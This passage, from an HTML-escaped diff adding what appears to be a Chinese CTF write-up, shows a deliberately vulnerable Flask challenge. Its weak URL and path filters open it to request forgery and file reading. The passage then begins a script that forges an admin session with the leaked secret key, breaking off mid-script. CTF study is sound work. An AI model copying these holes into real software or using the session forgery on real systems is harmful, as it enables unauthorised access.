+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">error_message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;You do not have permission to access this page.Your username is not admin&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;game.html&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">form&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">error_message&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">error_message&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">user_input&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">validate_on_submit&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">user_input&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">user_input&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">data&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">user_input&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">game_play&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">user_input&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;game.html&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">form&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">user_input&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">user_input&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/upload&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">methods&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;GET&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;POST&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">upload&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">token&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">cookies&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;token&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">token&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">flash&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Please login first&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;warning&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">redirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">url_for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;login&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">decode_jwt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">token&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">form&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">UploadForm&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">payload&lt;/span> &lt;span class="ow">or&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;username&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s1">&amp;#39;admin&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">error_message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;You do not have permission to access this page.Your username is not admin.&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;upload.html&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">form&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">error_message&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">error_message&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">username&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;username&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">session&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;role&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="ow">or&lt;/span> &lt;span class="n">session&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;role&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s1">&amp;#39;admin&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">error_message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;You do not have permission to access this page.Your role is not admin.&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;upload.html&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">form&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">error_message&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">error_message&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">username&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;username&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">validate_on_submit&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">avatar&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">data&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">filename&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">secure_filename&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">filename&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">files&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;file&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">filename&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stream&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">content_type&lt;/span>&lt;span class="p">)}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">php_service_url&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;http://127.0.0.1/upload.php&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">response&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">post&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">php_service_url&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">files&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">files&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">response&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">status_code&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">200&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">flash&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">response&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;success&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">flash&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Failed to upload file to PHP service&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;danger&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;upload.html&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">form&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/view_uploads&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">methods&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;GET&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;POST&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">view_uploads&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">token&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">cookies&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;token&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">form&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">GameForm&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">token&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">error_message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;Please login first&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;view_uploads.html&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">form&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">error_message&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">error_message&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">decode_jwt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">token&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">error_message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;Invalid or expired token. Please login again.&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;view_uploads.html&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">form&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">error_message&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">error_message&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;username&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="s1">&amp;#39;admin&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">error_message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;You do not have permission to access this page.Your username is not admin&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;view_uploads.html&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">form&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">error_message&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">error_message&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">user_input&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">validate_on_submit&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">filepath&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">user_input&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">data&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pathurl&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">form&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;path&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;www.testctf.com&amp;#34;&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">pathurl&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="ow">or&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;127.0.0.1&amp;#34;&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">pathurl&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="ow">or&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/var/www/html/uploads/&amp;#39;&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">filepath&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="ow">or&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">filepath&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">error_message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;www.testctf.com must in path and /var/www/html/uploads/ must in filepath.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;view_uploads.html&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">form&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">error_message&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">error_message&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">params&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;s&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">filepath&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">response&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">pathurl&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">params&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">params&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">timeout&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;view_uploads.html&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">form&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">user_input&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">response&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">except&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">error_message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;500! Server Error&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;view_uploads.html&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">form&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">error_message&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">error_message&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;view_uploads.html&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">form&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">user_input&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">user_input&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/logout&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">logout&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">session&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">clear&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">response&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">make_response&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">redirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">url_for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;login&amp;#39;&lt;/span>&lt;span class="p">)))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">response&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">delete_cookie&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;token&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">flash&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;You have been logged out&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;info&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">response&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">app&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">run&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>可以看到还有个session，但是有key，很容易构造：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">flask&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Flask&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">session&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">app&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Flask&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="vm">__name__&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">app&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;SECRET_KEY&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;36f8efbea152e50b23290e0ed707b4b0&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/login&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">login&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># 设置用户角色为 admin&lt;/span>
